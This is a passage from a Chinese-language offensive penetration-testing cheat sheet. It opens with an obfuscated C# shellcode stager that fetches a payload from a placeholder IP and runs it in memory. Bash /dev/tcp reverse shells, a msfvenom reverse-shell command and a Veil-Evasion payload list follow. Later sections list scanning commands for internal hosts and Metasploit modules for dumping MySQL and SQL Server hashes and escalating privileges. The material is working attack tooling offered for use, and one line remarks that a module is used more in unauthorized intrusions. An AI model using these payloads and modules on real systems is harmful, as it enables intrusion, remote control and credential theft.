System.Threading;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RkfCHtll</span> &#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title">LiNGeDokqnEH</span> &#123;</span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">idCWVw</span>(<span class="params"><span class="built_in">string</span> VVUUJUQytjlL, <span class="built_in">int</span> eMcukOUqFuHbUv</span>)</span> &#123;</span><br><span class="line">			IPEndPoint nlttgWAMdEQgAo = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(VVUUJUQytjlL), eMcukOUqFuHbUv);</span><br><span class="line">				Socket fzTiwdk = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">				fzTiwdk.Connect(nlttgWAMdEQgAo);</span><br><span class="line">			&#125;</span><br><span class="line">			catch &#123; <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">			&#125; <span class="built_in">byte</span>[] gJVVagJmu = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">4</span>];</span><br><span class="line">				fzTiwdk.Receive(gJVVagJmu, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">				<span class="built_in">int</span> GFxHorfhzft = BitConverter.ToInt32(gJVVagJmu, <span class="number">0</span>);</span><br><span class="line">				<span class="built_in">byte</span>[] mwxyRsYNn = <span class="keyword">new</span> <span class="built_in">byte</span>[GFxHorfhzft + <span class="number">5</span>];</span><br><span class="line">				<span class="built_in">int</span> yVcZAEmXaMszAc = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (yVcZAEmXaMszAc &lt; GFxHorfhzft) &#123;</span><br><span class="line">					yVcZAEmXaMszAc += fzTiwdk.Receive(mwxyRsYNn, yVcZAEmXaMszAc + <span class="number">5</span>, (GFxHorfhzft - yVcZAEmXaMszAc) &lt; <span class="number">4096</span> ? (GFxHorfhzft - yVcZAEmXaMszAc) : <span class="number">4096</span>, <span class="number">0</span>);</span><br><span class="line">				&#125; <span class="built_in">byte</span>[] XEvFDc = BitConverter.GetBytes((<span class="built_in">int</span>)fzTiwdk.Handle);</span><br><span class="line">						Array.Copy(XEvFDc, <span class="number">0</span>, mwxyRsYNn, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">						mwxyRsYNn[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line">						<span class="keyword">return</span> mwxyRsYNn;</span><br><span class="line">		&#125; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hcvPkmyIZ</span>(<span class="params"><span class="built_in">byte</span>[] fPnfqu</span>)</span> &#123;</span><br><span class="line">						<span class="keyword">if</span> (fPnfqu != <span class="literal">null</span>) &#123;</span><br><span class="line">							UInt32 hcoGPUltNcjK = VirtualAlloc(<span class="number">0</span>, (UInt32)fPnfqu.Length, <span class="number">0x1000</span>, <span class="number">0x40</span>);</span><br><span class="line">								Marshal.Copy(fPnfqu, <span class="number">0</span>, (IntPtr)(hcoGPUltNcjK), fPnfqu.Length);</span><br><span class="line">								IntPtr xOxEPnqW = IntPtr.Zero;</span><br><span class="line">								UInt32 ooiiZLMzO = <span class="number">0</span>;</span><br><span class="line">								IntPtr wxPyud = IntPtr.Zero;</span><br><span class="line">								xOxEPnqW = CreateThread(<span class="number">0</span>, <span class="number">0</span>, hcoGPUltNcjK, wxPyud, <span class="number">0</span>, <span class="keyword">ref</span> ooiiZLMzO);</span><br><span class="line">								WaitForSingleObject(xOxEPnqW, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">						<span class="built_in">byte</span>[] dCwAid = <span class="literal">null</span>;</span><br><span class="line">							dCwAid = idCWVw(<span class="string">&quot;xx.xx.xx.xx&quot;</span>, xx);</span><br><span class="line">							hcvPkmyIZ(dCwAid);</span><br><span class="line">					&#125;[DllImport(<span class="string">&quot;kernel32&quot;</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 qWBbOS, UInt32 HoKzSHMU, UInt32 mqFcYDHjaQJye, UInt32 EbMqzSROjgb</span>);</span></span><br><span class="line"><span class="function">							[<span class="title">DllImport</span>(<span class="params"><span class="string">&quot;kernel32&quot;</span></span>)]<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 tqUXybrozZ, UInt32 FMmVpwin, UInt32 HhvKSTWeKKsuBOG, IntPtr wXrghrXxDXaJDj, UInt32 zHqryJZjmSJ, [DllImport(<span class="string">&quot;kernel32&quot;</span></span>)] <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr CApwDwK, UInt32 uzGJUddCYTd</span>);</span></span><br><span class="line"><span class="function">	&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/xx </span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>开源项目<ul>
<li> <a target="_blank" rel="noopener" href="https://github.com/g0tmi1k/msfpc">https://github.com/g0tmi1k/msfpc</a></li>
</ul>
</li>
</ul>
<h2 id="11-工具介绍-Veil-Evasion"><a href="#11-工具介绍-Veil-Evasion" class="headerlink" title="11. 工具介绍 Veil-Evasion"></a>11. 工具介绍 Veil-Evasion</h2><p>新版本：<a target="_blank" rel="noopener" href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p>可支持生成payloads:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;coldwar_wrapper</span><br><span class="line">auxiliary&#x2F;macro_converter</span><br><span class="line">auxiliary&#x2F;pyinstaller_wrapper</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_http_service</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_tcp_service</span><br><span class="line">c&#x2F;shellcode_inject&#x2F;flatc</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">cs&#x2F;shellcode_inject&#x2F;base64_substitution</span><br><span class="line">cs&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">go&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">native&#x2F;backdoor_factory</span><br><span class="line">native&#x2F;hyperion</span><br><span class="line">native&#x2F;pe_scrambler</span><br><span class="line">perl&#x2F;shellcode_inject&#x2F;flat</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;download_virtual</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;download_virtual_https</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;psexec_virtual</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">python&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_http_contained</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_https_contained</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;aes_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;aes_encrypt_HTTPKEY_Request</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;arc_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;base64_substitution</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;des_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;download_inject</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;flat</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;letter_substitution</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;pidinject</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;stallion</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_http_contained</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_https_contained</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">ruby&#x2F;shellcode_inject&#x2F;base64</span><br><span class="line">ruby&#x2F;shellcode_inject&#x2F;flat</span><br></pre></td></tr></table></figure>


<h1 id="三、-内网渗透"><a href="#三、-内网渗透" class="headerlink" title="三、 内网渗透"></a>三、 内网渗透</h1><h2 id="12-基于-UDP-发现内网存活主机"><a href="#12-基于-UDP-发现内网存活主机" class="headerlink" title="12. 基于 UDP 发现内网存活主机"></a>12. 基于 UDP 发现内网存活主机</h2><ul>
<li>nmap (慢)</li>
</ul>
<blockquote>
<p> nmap -sU -T5 -sV –max-retries 1 192.168.1.100 -p 500</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/discovery/udp_probe</p>
<p>use auxiliary/scanner/discovery/udp_sweep </p>
</blockquote>
<ul>
<li>unicornscan扫描</li>
</ul>
<blockquote>
<p>unicornscan -mU 192.168.1.100 </p>
</blockquote>
<ul>
<li>ScanLine扫描</li>
</ul>
<blockquote>
<p>scanline -bht 80,100-200,443 10.0.0.1-200</p>
</blockquote>
<h2 id="13-基于-ARP-发现内网存活主机"><a href="#13-基于-ARP-发现内网存活主机" class="headerlink" title="13. 基于 ARP 发现内网存活主机"></a>13. 基于 ARP 发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sn -PR 192.168.1.1/24</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/discovery/arp_sweep</p>
</blockquote>
<ul>
<li>netdiscover (kali)</li>
</ul>
<blockquote>
<p>netdiscover -r 192.168.1.0/24 -i wlan0</p>
</blockquote>
<ul>
<li>arp-scan（linux）</li>
</ul>
<blockquote>
<p>arp-scan –interface=wlan0 –localnet</p>
</blockquote>
<ul>
<li>Powershell</li>
</ul>
<blockquote>
<p>&gt;powershell.exe -exec bypass -Command “Import-Module .\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24”</p>
</blockquote>
<ul>
<li>arp scannet</li>
<li>arp-scan（windows）速度快</li>
</ul>
<blockquote>
<p>arp-scan.exe -t 192.168.1.1/24</p>
</blockquote>
<ul>
<li>arp-ping.exe</li>
</ul>
<blockquote>
<p>arp-ping.exe 192.168.1.100</p>
</blockquote>
<h2 id="19-基于netbios发现内网存活主机"><a href="#19-基于netbios发现内网存活主机" class="headerlink" title="19. 基于netbios发现内网存活主机"></a>19. 基于netbios发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sU –script nbstat.nse -p137 192.168.1.0/24 -T4</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/netbios/nbname</p>
</blockquote>
<ul>
<li>nbtscan扫描</li>
</ul>
<blockquote>
<p>nbtscan-1.0.35.exe -m 192.168.1.0/24 </p>
<p>nbtstat -n （推荐）</p>
</blockquote>
<ul>
<li>Linux：（推荐）</li>
</ul>
<blockquote>
<p>nbtscan -r 192.168.1.0/24</p>
<p>nbtscan -v -s: 192.168.1.0/24</p>
</blockquote>
<ul>
<li>NetBScanner</li>
</ul>
<h2 id="20-基于snmp发现内网存活主机"><a href="#20-基于snmp发现内网存活主机" class="headerlink" title="20. 基于snmp发现内网存活主机"></a>20. 基于snmp发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sU –script snmp-brute 192.168.1.0/24 -T4</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/snmp/snmp_enum</p>
</blockquote>
<ul>
<li>NetCrunch</li>
</ul>
<blockquote>
<p>项目地址：<a target="_blank" rel="noopener" href="https://www.adremsoft.com/demo/">https://www.adremsoft.com/demo/</a> </p>
</blockquote>
<ul>
<li>snmp for pl扫描</li>
</ul>
<blockquote>
<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/dheiland-r7/snmp">https://github.com/dheiland-r7/snmp</a> </p>
</blockquote>
<ul>
<li>snmpbulkwalk</li>
<li>snmp-check</li>
<li>snmptest</li>
</ul>
<h2 id="21-基于ICMP发现内网存活主机"><a href="#21-基于ICMP发现内网存活主机" class="headerlink" title="21. 基于ICMP发现内网存活主机"></a>21. 基于ICMP发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap ‐sP ‐PI 192.168.1.0/24 ‐T4</p>
<p>nmap ‐sn ‐PE ‐T4 192.168.1.0/24</p>
</blockquote>
<ul>
<li>CMD下扫描</li>
</ul>
<blockquote>
<p>for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr “TTL =” </p>
</blockquote>
<ul>
<li>powershell扫描</li>
</ul>
<blockquote>
<p>powershell.exe ‐exec bypass ‐Command “Import‐Module ./Invoke‐TSPingSweep.ps1 ; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ ResolveHost ‐ScanPort ‐Port 445,135”</p>
</blockquote>
<ul>
<li>tcping </li>
</ul>
<blockquote>
<p>tcping.exe ‐n 1 192.168.1.0 80 </p>
</blockquote>
<h2 id="22-基于SMB发现内网存活主机"><a href="#22-基于SMB发现内网存活主机" class="headerlink" title="22. 基于SMB发现内网存活主机"></a>22. 基于SMB发现内网存活主机</h2><ul>
<li>MSF</li>
</ul>
<blockquote>
<p>scanner/smb/smb_version</p>
</blockquote>
<ul>
<li>cme</li>
</ul>
<blockquote>
<p>cme smb 192.168.1.0/24</p>
</blockquote>
<ul>
<li>nmap</li>
</ul>
<blockquote>
<p>nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119</p>
</blockquote>
<ul>
<li>CMD</li>
</ul>
<blockquote>
<p>for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445</p>
</blockquote>
<ul>
<li>powershell</li>
</ul>
<blockquote>
<p>单IP：</p>
<p>445 | %{ echo ((new‐object Net.Sockets.TcpClient).Connect(“192.168.1.119”,$<em>)) “$</em> is open”} 2&gt;$null </p>
<p>多IP：</p>
<p>1..5 | % { $a = $<em>; 445 | % {echo ((new‐object Net.Sockets.TcpClient).Connect(“192.168.1.$a”,$</em>)) “Port $_ is open”} 2&gt;$null}</p>
<p>多port，多IP：</p>
<p>118..119 | % { $a = $<em>; write‐host “‐‐‐‐‐‐”; write‐host “192.168.1.$a”; 80,445 | % {echo ((new‐object Net.Sockets.TcpClient).Conn ect(“192.168.1.$a”,$</em>)) “Port $_ is open”} 2&gt;$null}</p>
</blockquote>
<h2 id="29-发现目标WEB程序敏感目录第一季"><a href="#29-发现目标WEB程序敏感目录第一季" class="headerlink" title="29. 发现目标WEB程序敏感目录第一季"></a>29. 发现目标WEB程序敏感目录第一季</h2><ul>
<li>DIRB</li>
</ul>
<blockquote>
<p>dirb <a target="_blank" rel="noopener" href="http://192.168.1.102/">http://192.168.1.102</a> ./ASPX.txt</p>
<p>dirb <a target="_blank" rel="noopener" href="http://192.168.1.102/">http://192.168.1.102</a> ./ASPX.txt,./DIR.txt ‐a “Mozilla/5.0 (compatible; Googlebot/2.1; +<a target="_blank" rel="noopener" href="http://www.google.com/bot.html)&quot;">http://www.google.com/bot.html)&quot;</a> -c “ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45” -z 100</p>
<p>-a 自定义UA</p>
<p>-c 自定义Cookie</p>
<p>-z 自定义延时</p>
</blockquote>
<h2 id="50-基于SqlDataSourceEnumerator发现内网存活主机"><a href="#50-基于SqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="50. 基于SqlDataSourceEnumerator发现内网存活主机"></a>50. 基于SqlDataSourceEnumerator发现内网存活主机</h2><p> SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="四、-MSF"><a href="#四、-MSF" class="headerlink" title="四、 MSF"></a>四、 MSF</h1><h2 id="32-配置vps上的msf"><a href="#32-配置vps上的msf" class="headerlink" title="32. 配置vps上的msf"></a>32. 配置vps上的msf</h2><ul>
<li>配置源</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie main</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie main</span><br><span class="line">deb http:&#x2F;&#x2F;security.debian.org&#x2F; jessie&#x2F;updates main</span><br><span class="line">deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; jessie&#x2F;updates main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie-updates main</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie-updates main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<ul>
<li>更新源</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update&amp;&amp;apt-get upgrade</span><br></pre></td></tr></table></figure>
<ul>
<li>安装MSF</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
<p>以此种方式安装，也无需在配置psql</p>
<h2 id="23-基于MSF发现内网存活主机第一季"><a href="#23-基于MSF发现内网存活主机第一季" class="headerlink" title="23. 基于MSF发现内网存活主机第一季"></a>23. 基于MSF发现内网存活主机第一季</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep </span><br><span class="line">auxiliary/scanner/discovery/udp_sweep </span><br><span class="line">auxiliary/scanner/ftp/ftp_version </span><br><span class="line">auxiliary/scanner/http/http_version </span><br><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
<h2 id="24-基于MSF发现内网存活主机第二季"><a href="#24-基于MSF发现内网存活主机第二季" class="headerlink" title="24. 基于MSF发现内网存活主机第二季"></a>24. 基于MSF发现内网存活主机第二季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version</span><br></pre></td></tr></table></figure>
<h2 id="25-基于MSF发现内网存活主机第三季"><a href="#25-基于MSF发现内网存活主机第三季" class="headerlink" title="25. 基于MSF发现内网存活主机第三季"></a>25. 基于MSF发现内网存活主机第三季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;title</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>
<h2 id="26-基于MSF发现内网存活主机第四季"><a href="#26-基于MSF发现内网存活主机第四季" class="headerlink" title="26. 基于MSF发现内网存活主机第四季"></a>26. 基于MSF发现内网存活主机第四季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;smtp&#x2F;smtp_version</span><br></pre></td></tr></table></figure>
<h2 id="27-基于MSF发现内网存活主机第五季"><a href="#27-基于MSF发现内网存活主机第五季" class="headerlink" title="27. 基于MSF发现内网存活主机第五季"></a>27. 基于MSF发现内网存活主机第五季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;pop3&#x2F;pop3_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous</span><br><span class="line">db_nmap</span><br></pre></td></tr></table></figure>
<h2 id="28-基于MSF发现内网存活主机第六季"><a href="#28-基于MSF发现内网存活主机第六季" class="headerlink" title="28. 基于MSF发现内网存活主机第六季"></a>28. 基于MSF发现内网存活主机第六季</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_ad_computers</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_computers</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_domain</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_domains</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_ad_user_comments</span><br></pre></td></tr></table></figure>
<p>在实战过程中，许多特殊环境下<code>scanner</code>，<code>db_nmap</code>不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而post下的模块，弥补了该诉求，以便快速了解域中存活主机</p>
<h2 id="33-攻击Mysql服务"><a href="#33-攻击Mysql服务" class="headerlink" title="33. 攻击Mysql服务"></a>33. 攻击Mysql服务</h2><ul>
<li><p>auxiliary/scanner/mysql/mysql_login</p>
<blockquote>
<p> 常用于内网中的批量以及单主机的登录测试</p>
</blockquote>
</li>
<li><p>exploit/multi/mysql/mysql_udf_payload </p>
<blockquote>
<p>常用于root启动的mysql 并root的udf提权</p>
</blockquote>
</li>
<li><p>exploit/windows/mysql/mysql_mof </p>
<blockquote>
<p>Mof提权</p>
</blockquote>
</li>
<li><p>exploit/windows/mysql/scrutinizer_upload_exec </p>
<blockquote>
<p>上传文件执行</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mysql/mysql_hashdump</p>
<blockquote>
<p>mysql的mysql.user表的hash </p>
</blockquote>
</li>
<li><p>auxiliary/admin/mysql/mysql_sql </p>
<blockquote>
<p>执行sql语句。尤其是在目标机没有web界面等无法用脚本执行的环境</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mysql/mysql_version</p>
<blockquote>
<p>常用于内网中的批量mysql主机发现</p>
</blockquote>
</li>
</ul>
<h2 id="34-攻击Sql-server-服务"><a href="#34-攻击Sql-server-服务" class="headerlink" title="34. 攻击Sql server 服务"></a>34. 攻击Sql server 服务</h2><ul>
<li><p>auxiliary/admin/mssql/mssql_enum</p>
<blockquote>
<p>非常详细的目标机Sql server 信息</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_enum_sql_logins</p>
<blockquote>
<p>枚举sql logins，速度较慢，不建议使用</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_escalate_dbowner</p>
<blockquote>
<p>发现dbowner，当sa无法得知密码的时候，或者需要其他账号提供来支撑下一步的内网渗透</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_exec</p>
<blockquote>
<p>当没有激活xp_cmdshell，自动激活。并且调用执行cmd命令。权限继承 Sql server</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_sql</p>
<blockquote>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_sql_file</p>
<blockquote>
<p>当需要执行多条sql语句的时候，或者非常复杂。msf本身支持执行sql文件。授权渗透应用较少，非授权应用较多的模块</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_hashdump</p>
<blockquote>
<p>mssql的hash导出</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_login</p>
<blockquote>
<p>支持RHOSTS，来批量发现内网mssql主机</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_ping</p>
<blockquote>
<p>查询mssql 实例，实战中，应用较少</p>
</blockquote>
</li>
<li><p>exploit/windows/mssql/mssql_payload</p>
<blockquote>
<p>针对不同时间版本的系统都有着自己独特的方式来上传payload(windows 2003需要set method old)</p>
</blockquote>
</li>
<li><p>post/windows/manage/mssql_local_auth_bypass</p>
<blockquote>
<p>post模块都属于后渗透模块</p>
</blockquote>
</li>
</ul>
